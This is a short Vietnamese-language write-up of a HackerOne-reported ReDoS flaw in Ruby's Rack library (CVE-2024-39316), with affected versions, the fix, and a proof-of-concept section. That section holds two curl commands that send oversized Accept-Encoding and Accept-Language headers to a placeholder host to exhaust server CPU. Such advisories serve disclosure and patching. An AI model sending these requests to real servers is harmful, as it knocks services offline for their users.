# https://hackerone.com/reports/2584376

**Thông tin lỗ hổng:**

* **Tên:** ReDoS (Regular Expression Denial of Service)
* **Module ảnh hưởng:** `Rack::Request::Helpers` (thư viện Ruby Rack)
* **CVE:** [CVE-2024-39316](https://github.com/rack/rack/security/advisories/GHSA-cj83-2ww7-mvq7)
* **Phạm vi ảnh hưởng:** Rack >= 3.0.0 và <= 3.1.4
* **Fix:** Đã được vá ở phiên bản 3.1.5 qua commit [97952ac](https://github.com/rack/rack/commit/97952ac5ea99976b75469a19191ee71bde0ebb0f.patch)

---

### 🔥 Mô tả lỗi:

Khi một request được gửi đến server có header `Accept-Encoding` hoặc `Accept-Language` với giá trị được craft tinh vi theo pattern regex gây ra "catastrophic backtracking", máy chủ sẽ mất **rất nhiều thời gian tính toán**, gây ra **từ chối dịch vụ (DoS)**.

---

### 💣 PoC (Proof of Concept)

```bash
curl -v https://target.com \
  -H 'Accept-Encoding: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa, gzip'
```

Hoặc với `Accept-Language`:

```bash
curl -v https://target.com \
  -H 'Accept-Language: aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa, en-US'
```

> 🔍 Phân tích: Server dùng thư viện Rack sẽ parse chuỗi header này bằng biểu thức chính quy không được tối ưu, gây treo CPU khi độ dài chuỗi tăng lên.

---
